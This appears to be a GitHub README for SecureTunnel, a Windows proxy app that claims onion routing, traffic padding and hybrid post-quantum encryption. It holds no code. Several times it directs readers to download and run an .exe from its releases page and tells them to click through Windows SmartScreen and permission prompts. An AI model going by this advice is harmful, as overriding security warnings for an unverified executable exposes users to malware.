# 🛡️ SecureTunnel - Private Windows Proxy for Everyday Use

[![Download SecureTunnel](https://img.shields.io/badge/Download%20SecureTunnel-7B68EE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/alixblae550/SecureTunnel/releases)

## 🚀 Getting Started

SecureTunnel is a Windows app that sets up a private tunnel with a simple GUI launcher. It gives you a SOCKS5 and HTTP proxy, auto-restart support, and circuit rotation. It runs as a single `.exe`, so you do not need Python or extra tools.

Use the release page to download and run this app on Windows:

[Visit the SecureTunnel releases page](https://github.com/alixblae550/SecureTunnel/releases)

## 📥 Download and Run

1. Open the [SecureTunnel releases page](https://github.com/alixblae550/SecureTunnel/releases)
2. Find the latest release
3. Download the Windows `.exe` file
4. If your browser saves it to Downloads, open that folder
5. Double-click the `.exe` file to run it
6. If Windows asks for permission, choose Allow or Run
7. The GUI launcher will open and guide you through setup

If you keep the app in the same folder, SecureTunnel can restart cleanly and keep its tunnel settings in place.

## 🖥️ What SecureTunnel Does

SecureTunnel builds a 3-node onion tunnel for Windows. It routes traffic through several layers so your connection does not rely on a single path. The app uses TLS-in-TLS transport with a Chrome-like fingerprint, which helps the connection blend in with normal web traffic.

It also includes:

- X25519 + ML-KEM-768 hybrid key exchange
- Bucket padding for fixed-size traffic blocks
- Sinusoidal cover traffic
- SOCKS5 proxy support
- HTTP proxy support
- DNS-over-HTTPS support
- Anti-probing 2.0
- GUI launcher
- Auto-restart
- Circuit rotation

These features work together to keep the app steady and harder to block.

## 🧰 System Requirements

SecureTunnel is made for Windows desktop users.

- Windows 10 or Windows 11
- 64-bit system
- 4 GB RAM or more
- 200 MB free disk space
- Internet access for setup and normal use
- Permission to run downloaded apps

For best results, use a stable network connection and keep Windows up to date.

## 🛠️ Install Steps

1. Go to the [releases page](https://github.com/alixblae550/SecureTunnel/releases)
2. Download the latest Windows build
3. Save the file to a folder you can find again, like Downloads or Desktop
4. Right-click the `.exe` if you want to scan it first
5. Double-click the file to launch SecureTunnel
6. Choose your proxy mode in the GUI
7. Leave the app open while you use your browser or other apps
8. If the app closes, open it again from the same file

If Windows shows a SmartScreen prompt, choose the option that lets you run the file.

## 🌐 How to Use It

SecureTunnel works as a local proxy. After you start it, your apps can connect through it.

Typical use:

- Open SecureTunnel
- Start the tunnel in the launcher
- Set your browser or app to use the local SOCKS5 proxy
- Or set it to use the local HTTP proxy
- Keep DNS-over-HTTPS enabled for name lookups
- Let circuit rotation run so the path changes on its own

If you only want browser use, set the proxy inside your browser settings. If you want system-wide use, point your app or network settings to the local proxy address shown in the launcher.

## 🔒 Privacy Features

SecureTunnel adds several layers to make traffic harder to inspect and block.

- Onion routing spreads traffic across 3 nodes
- TLS-in-TLS hides traffic inside another TLS layer
- Chrome fingerprint helps traffic look normal
- Hybrid KEM uses both X25519 and ML-KEM-768
- Bucket padding makes packet sizes less obvious
- Sinusoidal cover traffic adds extra noise
- Anti-probing 2.0 helps resist scan attempts

These features focus on transport privacy and blocking resistance.

## 🔁 Auto-Restart and Circuit Rotation

SecureTunnel includes auto-restart so the tunnel can recover if a path drops. It also rotates circuits on a schedule. That helps reduce linkability and keeps the connection from staying on one route for too long.

Use this when you want:

- Fewer manual restarts
- A tunnel that recovers on its own
- Fresh routes over time
- Less predictable traffic patterns

## 🧭 Proxy Setup

SecureTunnel can expose two common proxy types:

- SOCKS5 proxy for apps that support it
- HTTP proxy for browsers and tools that use proxy settings

Common local setup values:

- Host: `127.0.0.1`
- Port: shown in the SecureTunnel launcher

If your browser asks for proxy details, enter the local host and port shown in the app. If you use a different app, look for its network or proxy settings and choose SOCKS5 or HTTP.

## 🧪 First Run Checklist

Before you start browsing, check these items:

- The app opens without errors
- The tunnel status shows active
- The proxy port matches your app settings
- DNS-over-HTTPS is on if you want it
- Your browser is set to use the local proxy
- Traffic goes through the tunnel before you sign in anywhere

If a site does not load, stop the tunnel, start it again, and check the proxy port.

## 🗂️ Files You May See

You may see a few files near the `.exe` after you run SecureTunnel:

- Config file
- Log file
- Cache folder
- Session data

Keep these files in the same folder as the app. That helps SecureTunnel remember your settings and restart cleanly.

## 🧩 Tips for Smooth Use

- Keep SecureTunnel open while you browse
- Do not move the `.exe` after you set it up
- Use one proxy mode at a time
- Leave circuit rotation on for normal use
- Restart the app after changing proxy settings
- Use the same Windows user account each time
- Keep your browser proxy settings simple

## ❓ Common Questions

### Does SecureTunnel need Python?
No. It runs as a single Windows `.exe`.

### Does it work like a VPN?
It works as a tunnel and local proxy, not a full VPN app.

### Can I use it with Chrome?
Yes. Set Chrome or your browser to use the local proxy that SecureTunnel shows.

### Can I use it with other apps?
Yes. Any app that supports SOCKS5 or HTTP proxy settings can use it.

### Does it change my IP address?
Traffic goes through the tunnel path, so the remote site sees the tunnel exit path, not your local network path.

### Is setup hard?
No. Download the file, run it, and point your app to the local proxy.

## 🧾 Release Download

Download the Windows build from the official release page:

[https://github.com/alixblae550/SecureTunnel/releases](https://github.com/alixblae550/SecureTunnel/releases)

## 📌 Project Topics

anonymity, anti-censorship, cryptography, encryption, http-proxy, network-security, onion-routing, p2p, post-quantum, privacy, proxy, security-tools, self-hosted, socks5, tls, tor-like, tunnel, vpn, windows